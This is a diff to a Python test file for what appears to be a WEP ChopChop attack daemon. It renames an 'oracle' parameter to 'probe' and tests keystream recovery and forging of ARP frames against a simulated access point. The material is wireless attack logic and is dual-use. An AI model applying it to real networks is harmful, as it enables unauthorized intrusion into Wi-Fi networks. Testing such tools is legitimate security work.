@@ -1,12 +1,12 @@
 """Offline tests for the WEP ChopChop daemon.
 
-The live oracle (does the AP relay?) is hardware-verified by the probe; here we
+The AP's relay (does it relay a correct guess?) is hardware-verified by the probe; here we
 prove the OFFLINE-testable core — the byte-walk keystream recovery, the
 tag-and-read-back identity mechanism, and the forge/handoff — by driving the
 daemon with a SIMULATED AP (decrypt the shortened frame with a known key, relay
 iff the ICV is valid, echoing back the MAC tag we stamped). If recovery
 reproduces the true keystream against that, the attack logic is correct; only
-the on-air relay path needs the box.
+the on-air relay path needs real hardware.
 """
 from __future__ import annotations
 
@@ -85,11 +85,10 @@ def _ip_cipher():
     return cipher, ks
 
 
-def _sim_oracle(iv: bytes, key: bytes):
-    """Stand in for the AP at the abstract oracle level: return the (unique)
-    guess whose chopped+fixed frame has a valid ICV — exactly the byte the AP
-    would relay. None if none do."""
-    async def oracle(body: bytes):
+def _sim_probe(iv: bytes, key: bytes):
+    """Stand in for the live AP: return the (unique) guess whose chopped+fixed
+    frame has a valid ICV, exactly the byte the AP would relay. None if none do."""
+    async def probe(body: bytes):
         for g in range(256):
             short = chop_last_byte_and_fixup(body, g)
             kstream = _rc4(iv + key, len(short))
@@ -97,10 +96,10 @@ def _sim_oracle(iv: bytes, key: bytes):
             if (zlib.crc32(plain) & 0xFFFFFFFF) == CRC32_RESIDUE:
                 return g
         return None
-    return oracle
+    return probe
 
 
-def _daemon(oracle=None):
+def _daemon(probe=None):
     calls = []
     iface = SimpleNamespace(
         register_rx_callback=lambda c: None,
@@ -108,7 +107,7 @@ def _daemon(oracle=None):
     )
     d = WepChopChop(
         iface, SimpleNamespace(bssid=BSSID), SimpleNamespace(),
-        source_mac=OUR, on_forged_arp=lambda f: calls.append(f), oracle=oracle,
+        source_mac=OUR, on_forged_arp=lambda f: calls.append(f), probe=probe,
     )
     d._active = True
     d._cur_iv, d._cur_keyid = IV, 0
@@ -133,7 +132,7 @@ def _assert_valid_forged_arp(forged: bytes):
 @pytest.mark.slow
 async def test_chop_and_forge_recovers_and_forges_valid_arp():
     cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
-    d, _ = _daemon(oracle=_sim_oracle(IV, KEY))
+    d, _ = _daemon(probe=_sim_probe(IV, KEY))
     forged = await d._chop_and_forge(cipher)
     assert forged is not None
     _assert_valid_forged_arp(forged)
@@ -144,7 +143,7 @@ async def test_chop_and_forge_none_when_ap_silent():
 
     async def never(_body):
         return None
-    d, _ = _daemon(oracle=never)
+    d, _ = _daemon(probe=never)
     # No byte relays at full length → gap is the whole tail (>1 byte) → give up.
     assert await d._chop_and_forge(cipher) is None
 
@@ -157,7 +156,7 @@ async def test_chop_and_forge_aborts_on_relayed_sentinel():
 
     async def sentinel(_body):
         return _SENTINEL
-    d, _ = _daemon(oracle=sentinel)
+    d, _ = _daemon(probe=sentinel)
     d._log = logs.append
     assert await d._chop_and_forge(cipher) is None
     assert any("bad-ICV" in m for m in logs)
@@ -277,7 +276,7 @@ async def test_loop_picks_seed_from_store_and_chops_end_to_end():
                     source_mac=OUR,
                     on_forged_arp=lambda f: holder.setdefault("f", f),
                     log_callback=logs.append,
-                    oracle=_sim_oracle(IV, KEY))
+                    probe=_sim_probe(IV, KEY))
     d.start()
     try:
         await asyncio.wait_for(d._task, timeout=2.0)     # re-raises a loop crash
@@ -302,7 +301,7 @@ def test_treelog_connectors():
 @pytest.mark.slow
 async def test_succeed_hands_forged_arp_to_campaign_and_stops():
     cipher, _ = _arp_cipher(bytes([192, 168, 1, 50]), bytes([192, 168, 1, 1]))
-    d, calls = _daemon(oracle=_sim_oracle(IV, KEY))
+    d, calls = _daemon(probe=_sim_probe(IV, KEY))
     forged = await d._chop_and_forge(cipher)
     d._succeed(forged)
     assert d.is_active is False                  # immediate handoff stopped it
@@ -327,7 +326,7 @@ async def test_stop_halts_an_in_flight_byte_walk():
                             unregister_rx_callback=lambda c: None)
     d = WepChopChop(iface, SimpleNamespace(bssid=BSSID),
                     SimpleNamespace(chop_candidates=lambda b: [captured]),
-                    source_mac=OUR, on_forged_arp=lambda f: None, oracle=slow)
+                    source_mac=OUR, on_forged_arp=lambda f: None, probe=slow)
     d.start()
     await asyncio.sleep(0.02)         # let the walk get in-flight
     assert d.is_active
